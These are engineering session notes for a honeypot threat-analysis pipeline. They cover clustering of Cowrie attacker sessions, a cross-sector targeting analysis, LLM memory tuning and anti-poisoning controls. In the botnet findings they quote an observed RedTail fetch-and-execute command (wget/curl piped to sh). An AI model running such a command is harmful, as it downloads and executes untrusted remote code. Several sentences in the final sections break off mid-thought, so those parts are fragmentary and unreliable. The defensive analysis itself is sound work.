# Session 15 — Cowrie session/TTP analyzer BUILT (src/cowrie_ttp.py)

Deliverable #3 from notes/strategy-2026-08-04.md. The adversary-behaviour
layer: reputation tells you who an IP is, this tells you what they DID.

## How it works (all deterministic except the narrative)
1. Pages Cowrie login.success / command.input / file_download / login.failed
   for the window (~9.4k events/24h) via search_after.
2. Reconstructs sessions by the `session` field: source IP, site, credentials
   used, ordered command sequence, downloaded payload hashes.
3. Normalises commands (IPs → <IP>, URLs → <URL>, hashes → <HASH>, numbers,
   /tmp paths) so the same behaviour clusters despite cosmetic variation.
4. Clusters by SHA-256 of the normalised sequence.
5. Attributes each cluster to sector(s) via the SECTORS host map, and flags
   `sector_exclusive` when a cluster only ever hit one sector.
6. Scores novelty against a 30-day baseline of every distinct command.
7. Locked-down `rawingest` profile explains clusters + maps ATT&CK from a
   curated menu; a regex validator flags any off-menu id.

## First run (2026-08-04, last 24h)
- 9,378 events → 7,265 sessions → **114 command clusters**
- 188 interactive sessions, 277 successful logins, 1,758 commands,
  65 payload downloads
- **107 of 114 clusters are sector-exclusive** — strong targeting signal
- Sector split of INTERACTIVE sessions: VoIP/telephony 107, RMM 51,
  petrochemical 29, **medical technology 1**

## Findings worth acting on
- **RedTail botnet identified**: cluster `f51f8c5f99bd` (5 sessions, 5 IPs,
  VoIP + petrochemical) runs
  `wget --no-check-certificate -qO- <URL> || curl -sk <URL> | sh -s telnet`
  followed by a hex-encoded string decoding to `redtail_bot_telnet_`.
  Known cryptomining botnet. Found on day one.
- **The medtech paradox**: db4lamedtech takes the largest scan volume
  (1.86M events, incl. the 380k-event unclassified source 170.101.101.98)
  but only ONE interactive session. Volume and hands-on-keyboard activity
  are inversely distributed across sectors — exactly the differential the
  strategy predicted would be visible.

## Bugs found and fixed during the build
- Baseline terms agg capped at 3,000 of 3,736 distinct commands → silently
  inflated novelty. Raised to 20,000 with a truncation warning.
- Cowrie captures raw bytes; binary probes rendered as garbage. Added
  `printable()` sanitiser (also applied to what the LLM sees).
- Novelty was a blunt boolean; now reports `novelty_ratio`,
  `novel_command_count` and `fully_novel` (whole sequence unseen), since one
  new payload URL in a known pattern is not new tradecraft.
- **Validator earned its keep on the first LLM run**: model cited
  `T1204.001` and `T1566.001`, both wrong and off-menu. Flagged inline.

## Usage
  python3 ~/bin/cowrie_ttp.py [--hours 24] [--baseline-days 30] [--no-llm]
Outputs ~/reports/YYYY-MM-DD-cowrie-ttp.md + evidence JSON. Read-only.

# Session 16 — Cross-sector differential analysis BUILT (src/sector_diff.py)

Deliverable #1 (and #4, the reputation-blind queue, which falls out of it).

## What it computes
- **Sector profiles**: per-site events, unique IPs, top ports/countries/ASNs,
  honeypot mix, and **reputation coverage %**.
- **Concentration** per entity: share of its events landing in one sector.
  1.0 = single-sector = targeting rather than sweeping.
- **Reputation-blind queue**: entities with NO `ip_rep` label that are still
  high-volume, novel, or fully concentrated.
- **Coordinated ASN campaigns**: 3+ IPs from one provider, grouped, ranked by
  concentration → novelty → volume.
- Port / ASN / country skew across sectors.

## First-run findings (2026-08-04, 24h, top 500 IPs)
- **76.8% of the top 500 IPs are sector-exclusive.** Targeting is the norm.
- **427 of 500 carry no reputation label at all.**
- **Reputation coverage varies hugely by sector**: petrochemical 16.2%,
  VoIP 32.1%, medtech 42.3%, RMM 60.2%, general hive 0%. The petrochemical
  sensor's traffic is ~84% unclassified — a large blind spot.
- Ports differ sharply by sector: petro = 5900 VNC + 389 LDAP;
  medtech = 80/8443 HTTP(S); RMM = 22 SSH; VoIP = 5060 SIP.

### Coordinated campaigns surfaced (all sector-concentrated)
| Provider | IPs | Events | Sector | Unlabelled |
|---|---|---|---|---|
| Plus Hosting Grupa (Croatia) | 24 | 47,064 | petrochemical 100% | 24/24 |
| 1337 Services GmbH | 30 | 127,216 | medtech 100% | 30/30 |
| Tencent | 44 | 35,300 | petrochemical 100% | 43/44 |
| Datacamp Limited | 21 | 60,239 | medtech 99% | 21/21 |
| DigitalOcean | 20 | 958,522 | petrochemical 100% | 14/20 |

The Croatian block (178.218.16x, ASN Plus Hosting Grupa) is the clearest
case: 24 hosts, one country, one provider, **exclusively** the petrochemical
sensor, probing **389/LDAP and 3283/ARD**, every one of them unknown to every
reputation feed. Individually each looks like ~2k events of noise; grouped by
ASN it is a single campaign. `1337 Services GmbH` is a known abuse-tolerant
host — worth a closer look.

## Bug found and fixed
- First version enumerated every distinct IP over 30 days to build the
  baseline: the terms agg truncated and **dropped 629,073 docs**, overstating
  novelty. Replaced with a targeted `seen_before()` that asks about only the
  ~500 IPs under analysis, chunked 500 per query. Exact, and far cheaper.

## Known model quirk (cosmetic)
Hermes-4.3-36B sometimes emits CJK punctuation (，、（）。) mid-sentence in
English prose. Harmless but untidy; a post-pass could normalise it.

## Usage
  python3 ~/bin/sector_diff.py [--hours 24] [--baseline-days 30] [--top 500] [--no-llm]
Outputs ~/reports/YYYY-MM-DD-sector-diff.md + evidence JSON. Read-only.

# Session 18 — Studio pinning attempted: memory math does not allow it

Operator chose option 1 (pin Hermes-4.3-36B on the Studio). Attempted; it
does not fit. Reverted to the laptop. **Root cause found and partly fixed.**

## Root cause of the 127 s calls
`Hermes-4.3-36B-GGUF:Q6_K` declares a **524,288-token** native context
(`seed_oss.context_length`). Ollama sizes the KV cache to that by default:
~137 GB, more than the Studio's entire 128 GB. Every call was swapping to
disk.

## Partial fix applied (kept on the Studio)
Created a derived model via `POST /api/create`:

    model: hermes-cti-64k        from: hf.co/NousResearch/Hermes-4.3-36B-GGUF:Q6_K
    parameters: {num_ctx: 65536}

Cold load fell **127 s → 15 s**. The variant is still on the Studio and is
the right thing to use once memory allows.

## Why pinning still fails
- `hermes-cti-64k` resident size: **98.7 GB**. Ollama's default
  `OLLAMA_NUM_PARALLEL=4` allocates the 64K KV cache four times over
  (~17 GB × 4 + ~30 GB weights).
- The tsec pipeline pins **two** models with `keep_alive: -1`:
  `qwen2.5:32b` (54.2 GB) + `qwen2.5-coder:14b` (34.5 GB) = **88.7 GB**.
- Free headroom: ~39 GB. Ours needs 98.7 GB → every call evicts theirs, and
  their pipeline immediately reloads, evicting ours. **~2 m 20 s per call,
  warm or cold.**
- Laptop for comparison: ~1 m 25 s, no contention, nothing else displaced.

## What would actually make the Studio work (needs shell access there)
1. `OLLAMA_NUM_PARALLEL=1` (or 2) on the Studio → our model drops to
   ~47 GB. **Biggest single win; nothing else changes.**
2. Unpin `qwen2.5-coder:14b` if the analytics tier does not need it hot →
   frees 34.5 GB. With (1) this leaves 128 − 54 − 47 ≈ 27 GB spare and all
   three models stay resident.
3. Then pin `hermes-cti-64k` and repoint both Hermes profiles to
   `http://76.165.200.8:11436/v1`.

Operator is exposing `:11435` (the caching proxy) tomorrow — worth
re-testing through it first, since it may already handle queuing.

## Current state
Reverted: both profiles on `http://10.0.0.61:11434/v1` (laptop) with
Hermes-4.3-36B @ 64K. Verified working. Their two production models are

## Anti-poisoning controls (operator asked; Claude + ChatGPT answered
independently — see notes/poisoning-{claude,chatgpt}.md and the merged
notes/poisoning-plan.md)

Governing principle both reached: *attacker-controlled content can describe
what was typed; it can never establish who they are, what sector they
targeted, what malware they used, or how important a finding is.*

Implemented:
- `evidence` (OBSERVED) vs `asserted` (attacker-claimed) columns. URLs found

  * sector attribution ONLY from sensor identity, never from command text

  * ATT&CK must say "attempted" absent evidence of effect;
  * **never name commercial vendors/feeds** (operator instruction).

55 with high poisoning risk and named reasons, while multi-host ASN campaigns
stayed on top. The ranking now favours hard-to-fake over striking-looking.

## Data expansion (Claude + ChatGPT answers in

**Premise correction:** we are NOT Cowrie-only. `sector_diff.py` already spans
every sensor at metadata level. The gap is that *behavioural* analysis —

Verified by query, the unused richness:
| Sensor | /day | Key fields |
|---|---|---|
| Beelzebub | 227k | input, output, session, username, service |
| Heralding | 494k | username, password, proto, session_id |

**Both models agree on the shortlist; they differ on order.** Claude: start

available — the exact opposite of the poisoning-prone string evidence.

**Both agree on what breaks at scale:** the registry must become
aggregation-first (campaign-level keys, not per-event), volume must saturate
rather than keep raising priority, and priority models must be per-type —
one valid DICOM C-ECHO should outrank 50,000 SSH failures.
